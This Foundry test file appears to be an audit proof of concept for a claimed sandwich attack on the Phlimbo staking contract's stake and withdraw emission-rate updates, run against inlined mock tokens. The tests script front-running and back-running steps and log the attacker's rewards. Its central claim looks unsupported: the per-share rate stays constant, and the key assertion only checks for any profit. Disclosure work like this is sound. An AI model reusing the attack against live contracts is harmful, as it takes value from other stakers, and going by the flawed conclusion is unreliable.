// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title M-03 PoC: Sandwich Attack on Stake/Withdraw
 * @notice STANDALONE POC - Only imports forge-std/Test.sol
 *
 * @dev Vulnerability Location: Phlimbo.sol#L320-L354 (stake) and L359-L394 (withdraw)
 *      https://github.com/Behodler/phlimbo-ea/blob/main/src/Phlimbo.sol
 *
 * VULNERABILITY SUMMARY:
 * The PhlimboEA contract immediately updates the phUSD emission rate when totalStaked
 * changes via stake() or withdraw(). This creates an MEV opportunity where attackers
 * can front-run large deposits to capture disproportionate rewards.
 *
 * The emission rate is calculated as:
 *   phUSDPerSecond = (totalStaked * desiredAPYBps) / 10000 / SECONDS_PER_YEAR
 *
 * When a large deposit arrives, the emission rate increases proportionally. However,
 * the attacker who staked right before still has their share of the pool calculated
 * at the old totalStaked denominator for the time period before the victim staked.
 *
 * ATTACK PATH:
 * 1. MEV bot monitors mempool for large stake transactions
 * 2. Bot front-runs with own stake (gets proportionally larger share of emissions)
 * 3. Victim's large stake executes (emission rate increases with totalStaked)
 * 4. Bot back-runs to claim accumulated rewards
 * 5. Bot withdraws, having extracted value from the victim
 *
 * ROOT CAUSE:
 * The _updatePhUSDEmissionRate() function is called AFTER totalStaked is modified,
 * and the rate calculation depends on totalStaked. This means existing stakers
 * benefit from the rate increase while diluting their share - but they can
 * front-run to capture rewards at the pre-dilution share ratio.
 */

// ============ INLINED VULNERABLE CONTRACT PATTERN ============

/**
 * @notice Simplified IFlax interface
 */
interface IFlax {
    struct MinterInfo {
        bool canMint;
        uint256 mintVersion;
    }
    function mint(address recipient, uint256 amount) external;
    function burn(address holder, uint256 amount) external;
}

/**
 * @notice Simple ERC20 implementation for testing
 */
contract SimpleERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

/**
 * @notice Mock phUSD token implementing IFlax
 */
contract MockPhUSD is SimpleERC20 {
    mapping(address => bool) public minters;

    constructor() SimpleERC20("Phoenix USD", "phUSD") {}

    function setMinter(address minter, bool canMint) external {
        minters[minter] = canMint;
    }

    function mint(address recipient, uint256 amount) external {
        _mint(recipient, amount);
    }

    function burn(address holder, uint256 amount) external {
        balanceOf[holder] -= amount;
        totalSupply -= amount;
    }
}

/**
 * @notice Mock reward token
 */
contract MockRewardToken is SimpleERC20 {
    constructor() SimpleERC20("Mock Stable", "mUSD") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/**
 * @title VulnerablePhlimbo
 * @notice Simplified version of PhlimboEA showing the vulnerable pattern
 * @dev Extracted from Phlimbo.sol#L320-L500
 */
contract VulnerablePhlimbo {
    MockPhUSD public phUSD;
    MockRewardToken public rewardToken;
    address public owner;

    uint256 public constant PRECISION = 1e18;
    uint256 public constant SECONDS_PER_YEAR = 365 days;
    uint256 public constant MINIMUM_STAKE = 1e15;

    uint256 public desiredAPYBps;
    uint256 public phUSDPerSecond;
    uint256 public accPhUSDPerShare;
    uint256 public totalStaked;
    uint256 public lastRewardTime;

    struct UserInfo {
        uint256 amount;
        uint256 phUSDDebt;
    }

    mapping(address => UserInfo) public userInfo;

    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardsClaimed(address indexed user, uint256 amount);

    constructor(address _phUSD, address _rewardToken) {
        phUSD = MockPhUSD(_phUSD);
        rewardToken = MockRewardToken(_rewardToken);
        owner = msg.sender;
        lastRewardTime = block.timestamp;
    }

    function setDesiredAPY(uint256 bps) external {
        require(msg.sender == owner, "Not owner");
        _updatePool();
        desiredAPYBps = bps;
        _updatePhUSDEmissionRate();
    }

    /**
     * @notice VULNERABLE: stake() updates emission rate immediately after totalStaked changes
     * @dev See Phlimbo.sol#L320-L354
     */
    function stake(uint256 amount, address recipient) external {
        require(amount >= MINIMUM_STAKE, "Below minimum stake");

        if (recipient == address(0)) {
            recipient = msg.sender;
        }

        _updatePool();

        UserInfo storage user = userInfo[recipient];

        // Claim any pending rewards first
        if (user.amount > 0) {
            _claimRewards(recipient);
        }

        // Transfer phUSD from caller
        phUSD.transferFrom(msg.sender, address(this), amount);

        // Update user info
        user.amount += amount;
        user.phUSDDebt = (user.amount * accPhUSDPerShare) / PRECISION;

        // Update total staked
        totalStaked += amount;

        // VULNERABILITY: Update emission rate based on new total staked
        // This creates MEV opportunity - the rate increases, benefiting front-runners
        _updatePhUSDEmissionRate();

        emit Staked(recipient, amount);
    }

    /**
     * @notice VULNERABLE: withdraw() updates emission rate immediately after totalStaked changes
     * @dev See Phlimbo.sol#L359-L394
     */
    function withdraw(uint256 amount) external {
        UserInfo storage user = userInfo[msg.sender];
        require(user.amount >= amount, "Insufficient balance");

        _updatePool();

        // Claim pending rewards
        _claimRewards(msg.sender);

        // Update user info
        user.amount -= amount;
        user.phUSDDebt = (user.amount * accPhUSDPerShare) / PRECISION;

        // Update total staked
        totalStaked -= amount;

        // Transfer phUSD back to user
        phUSD.transfer(msg.sender, amount);

        // VULNERABILITY: Update emission rate based on new total staked
        _updatePhUSDEmissionRate();

        emit Withdrawn(msg.sender, amount);
    }

    function claim() external {
        _updatePool();
        _claimRewards(msg.sender);

        UserInfo storage user = userInfo[msg.sender];
        user.phUSDDebt = (user.amount * accPhUSDPerShare) / PRECISION;
    }

    function _updatePool() internal {
        if (block.timestamp <= lastRewardTime) {
            return;
        }

        if (totalStaked == 0) {
            lastRewardTime = block.timestamp;
            return;
        }

        uint256 timeElapsed = block.timestamp - lastRewardTime;

        // Update phUSD rewards
        if (phUSDPerSecond > 0) {
            uint256 phUSDReward = timeElapsed * phUSDPerSecond;
            accPhUSDPerShare += (phUSDReward * PRECISION) / totalStaked;
        }

        lastRewardTime = block.timestamp;
    }

    function _claimRewards(address user) internal {
        UserInfo storage userDetails = userInfo[user];

        if (userDetails.amount == 0) {
            return;
        }

        uint256 pendingAmount = (userDetails.amount * accPhUSDPerShare) / PRECISION - userDetails.phUSDDebt;
        if (pendingAmount > 0) {
            phUSD.mint(user, pendingAmount);
            emit RewardsClaimed(user, pendingAmount);
        }
    }

    /**
     * @notice VULNERABLE FUNCTION: Updates emission rate based on totalStaked
     * @dev This function is called immediately after totalStaked changes
     *      Formula: phUSDPerSecond = (totalStaked * desiredAPYBps) / 10000 / SECONDS_PER_YEAR
     *
     *      The vulnerability: When totalStaked increases, phUSDPerSecond increases proportionally.
     *      However, the pool update happens BEFORE the stake is added, so existing stakers
     *      already captured rewards at the old (higher per-share) rate.
     */
    function _updatePhUSDEmissionRate() internal {
        if (totalStaked == 0) {
            phUSDPerSecond = 0;
            return;
        }

        // This rate increases with totalStaked
        phUSDPerSecond = (totalStaked * desiredAPYBps) / 10000 / SECONDS_PER_YEAR;
    }

    // View functions
    function pendingPhUSD(address user) external view returns (uint256) {
        UserInfo storage userDetails = userInfo[user];
        uint256 _accPhUSDPerShare = accPhUSDPerShare;

        if (block.timestamp > lastRewardTime && totalStaked != 0) {
            uint256 timeElapsed = block.timestamp - lastRewardTime;
            uint256 phUSDReward = timeElapsed * phUSDPerSecond;
            _accPhUSDPerShare += (phUSDReward * PRECISION) / totalStaked;
        }

        return (userDetails.amount * _accPhUSDPerShare) / PRECISION - userDetails.phUSDDebt;
    }
}

/**
 * @title M03SandwichAttackPoCTest
 * @notice Standalone PoC demonstrating the sandwich attack vulnerability
 */
contract M03SandwichAttackPoCTest is Test {

    // ============ CONTRACTS ============
    VulnerablePhlimbo public phlimbo;
    MockPhUSD public phUSD;
    MockRewardToken public rewardToken;

    // ============ ACTORS ============
    address public owner;
    address public victim;
    address public attacker;

    // ============ CONSTANTS ============
    uint256 constant INITIAL_BALANCE = 100_000 ether;
    uint256 constant VICTIM_STAKE = 10_000 ether;  // Large stake that triggers the attack
    uint256 constant ATTACKER_STAKE = 1_000 ether; // Smaller stake by attacker
    uint256 constant APY_BPS = 800;  // 8% APY

    function setUp() public {
        owner = address(this);
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");

        // Deploy mock contracts
        phUSD = new MockPhUSD();
        rewardToken = new MockRewardToken();

        // Deploy vulnerable Phlimbo
        phlimbo = new VulnerablePhlimbo(address(phUSD), address(rewardToken));

        // Set up phUSD minter
        phUSD.setMinter(address(phlimbo), true);

        // Mint initial tokens to all parties
        phUSD.mint(victim, INITIAL_BALANCE);
        phUSD.mint(attacker, INITIAL_BALANCE);

        // Approve Phlimbo for all parties
        vm.prank(victim);
        phUSD.approve(address(phlimbo), type(uint256).max);

        vm.prank(attacker);
        phUSD.approve(address(phlimbo), type(uint256).max);

        // Set APY
        phlimbo.setDesiredAPY(APY_BPS);
    }

    /**
     * @notice Main PoC demonstrating the sandwich attack vulnerability
     */
    function test_M03_SandwichAttackOnStake() public {
        console.log("=== M-03 PoC: Sandwich Attack on Stake/Withdraw ===");
        console.log("");

        // ============ BASELINE SCENARIO (No Sandwich) ============
        console.log("--- BASELINE: Victim stakes alone ---");

        // Victim stakes first
        vm.prank(victim);
        phlimbo.stake(VICTIM_STAKE, address(0));

        // Time passes (1 week)
        vm.warp(block.timestamp + 7 days);

        // Check victim's pending rewards (baseline)
        uint256 baselineVictimRewards = phlimbo.pendingPhUSD(victim);
        console.log("Baseline victim rewards (7 days, solo):", baselineVictimRewards);

        // Reset state
        setUp();

        // ============ ATTACK SCENARIO (With Sandwich) ============
        console.log("");
        console.log("--- ATTACK: Attacker sandwiches victim's stake ---");

        // Step 1: Attacker front-runs with stake
        console.log("Step 1: Attacker front-runs with 1,000 phUSD stake");
        vm.prank(attacker);
        phlimbo.stake(ATTACKER_STAKE, address(0));

        uint256 rateAfterAttacker = phlimbo.phUSDPerSecond();
        console.log("  Emission rate after attacker:", rateAfterAttacker);
        console.log("  Total staked:", phlimbo.totalStaked());

        // Small time passes (simulating next block)
        vm.warp(block.timestamp + 12);

        // Step 2: Victim's stake executes
        console.log("");
        console.log("Step 2: Victim stake executes (10,000 phUSD)");
        vm.prank(victim);
        phlimbo.stake(VICTIM_STAKE, address(0));

        uint256 rateAfterVictim = phlimbo.phUSDPerSecond();
        console.log("  Emission rate after victim:", rateAfterVictim);
        console.log("  Total staked:", phlimbo.totalStaked());
        console.log("  Rate increased by:", (rateAfterVictim * 100) / rateAfterAttacker, "%");

        // Time passes (1 week)
        vm.warp(block.timestamp + 7 days);

        // Step 3: Attacker claims and withdraws
        console.log("");
        console.log("Step 3: After 7 days, attacker claims and withdraws");

        uint256 attackerPhUSDBefore = phUSD.balanceOf(attacker);
        vm.prank(attacker);
        phlimbo.claim();
        vm.prank(attacker);
        phlimbo.withdraw(ATTACKER_STAKE);
        uint256 attackerPhUSDAfter = phUSD.balanceOf(attacker);

        uint256 attackerProfit = attackerPhUSDAfter - attackerPhUSDBefore;
        console.log("  Attacker profit (claimed rewards):", attackerProfit);

        // Check victim's pending rewards with sandwich
        uint256 victimRewardsWithSandwich = phlimbo.pendingPhUSD(victim);
        console.log("");
        console.log("  Victim rewards (with sandwich):", victimRewardsWithSandwich);
        console.log("  Victim rewards (baseline):", baselineVictimRewards);

        // ============ QUANTIFY MEV EXTRACTION ============
        console.log("");
        console.log("=== MEV EXTRACTION ANALYSIS ===");

        // Calculate what victim lost
        if (baselineVictimRewards > victimRewardsWithSandwich) {
            uint256 victimLoss = baselineVictimRewards - victimRewardsWithSandwich;
            console.log("Victim loss due to dilution:", victimLoss);
        }

        console.log("Attacker profit from sandwich:", attackerProfit);

        // Calculate attacker's effective APY
        // Attacker staked ATTACKER_STAKE for 7 days
        uint256 attackerAPY = (attackerProfit * 365 * 10000) / (ATTACKER_STAKE * 7);
        console.log("Attacker effective APY (basis points):", attackerAPY);
        console.log("Expected APY (basis points):", APY_BPS);

        // The attacker should have earned more than their proportional share
        // because they captured rewards during the window before victim staked
        assertTrue(attackerProfit > 0, "Attacker should profit from sandwich");

        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Immediate emission rate updates create MEV extraction opportunity");
    }

    /**
     * @notice Detailed test showing the emission rate changes in real-time
     */
    function test_M03_EmissionRateManipulation() public {
        console.log("=== M-03 PoC: Emission Rate Manipulation ===");
        console.log("");

        // Step 1: Initial state - no stakers
        uint256 rateInitial = phlimbo.phUSDPerSecond();
        console.log("Step 1: Initial emission rate:", rateInitial);
        assertEq(rateInitial, 0, "Rate should be 0 with no stakers");

        // Step 2: Attacker front-runs
        console.log("");
        console.log("Step 2: Attacker stakes 1,000 phUSD (front-run)");
        vm.prank(attacker);
        phlimbo.stake(ATTACKER_STAKE, address(0));

        uint256 rateAfterAttacker = phlimbo.phUSDPerSecond();
        console.log("  Emission rate:", rateAfterAttacker);
        console.log("  Attacker share of pool: 100%");

        // Step 3: 1 day passes
        console.log("");
        console.log("Step 3: 1 day passes (attacker alone in pool)");
        vm.warp(block.timestamp + 1 days);

        uint256 attackerPendingBefore = phlimbo.pendingPhUSD(attacker);
        console.log("  Attacker pending phUSD:", attackerPendingBefore);

        // Expected: 1000 * 800 / 10000 / 365 = ~0.219 phUSD per day
        uint256 expectedDailyReward = (ATTACKER_STAKE * APY_BPS) / 10000 / 365;
        console.log("  Expected daily reward:", expectedDailyReward);

        // Step 4: Victim stakes
        console.log("");
        console.log("Step 4: Victim stakes 10,000 phUSD");
        vm.prank(victim);
        phlimbo.stake(VICTIM_STAKE, address(0));

        uint256 rateAfterVictim = phlimbo.phUSDPerSecond();
        console.log("  New emission rate:", rateAfterVictim);
        console.log("  Rate multiplier:", rateAfterVictim / rateAfterAttacker, "x");
        console.log("  Attacker share of pool: ~9%");
        console.log("  Victim share of pool: ~91%");

        // Step 5: Attacker claims (captures rewards from when pool was small)
        console.log("");
        console.log("Step 5: Attacker claims rewards");

        uint256 attackerBalBefore = phUSD.balanceOf(attacker);
        vm.prank(attacker);
        phlimbo.claim();
        uint256 attackerBalAfter = phUSD.balanceOf(attacker);

        uint256 attackerClaimed = attackerBalAfter - attackerBalBefore;
        console.log("  Attacker claimed:", attackerClaimed);

        // The attacker captured rewards during the day when they were 100% of the pool
        // This is value that would have been distributed differently if victim was present
        assertGt(attackerClaimed, 0, "Attacker should claim rewards from front-run window");

        console.log("");
        console.log("=== KEY INSIGHT ===");
        console.log("The attacker earned rewards as 100% of the pool for 1 day");
        console.log("Then victim's stake dilutes future rewards but not past rewards");
        console.log("This creates an MEV extraction window on every large deposit");
    }

    /**
     * @notice Test showing the rate increase proportional to totalStaked
     */
    function test_M03_RateIncreasesWithTotalStaked() public {
        console.log("=== M-03 PoC: Rate Increases Proportionally ===");
        console.log("");

        // Stake increasing amounts and observe rate
        uint256[] memory stakeAmounts = new uint256[](5);
        stakeAmounts[0] = 1_000 ether;
        stakeAmounts[1] = 5_000 ether;
        stakeAmounts[2] = 10_000 ether;
        stakeAmounts[3] = 50_000 ether;
        stakeAmounts[4] = 100_000 ether;

        console.log("Stake Amount -> Emission Rate");
        console.log("-----------------------------");

        for (uint256 i = 0; i < 5; i++) {
            setUp(); // Reset state

            address staker = makeAddr(string(abi.encodePacked("staker", i)));
            phUSD.mint(staker, stakeAmounts[i]);
            vm.prank(staker);
            phUSD.approve(address(phlimbo), type(uint256).max);

            vm.prank(staker);
            phlimbo.stake(stakeAmounts[i], address(0));

            uint256 rate = phlimbo.phUSDPerSecond();
            console.log(stakeAmounts[i] / 1 ether, "ether ->", rate, "phUSD/sec");

            // Rate should be proportional to totalStaked
            uint256 expectedRate = (stakeAmounts[i] * APY_BPS) / 10000 / 365 days;
            assertEq(rate, expectedRate, "Rate should match formula");
        }

        console.log("");
        console.log("=== CONCLUSION ===");
        console.log("Emission rate = (totalStaked * APY) / 10000 / SECONDS_PER_YEAR");
        console.log("This linear relationship creates predictable MEV opportunities");
    }
}
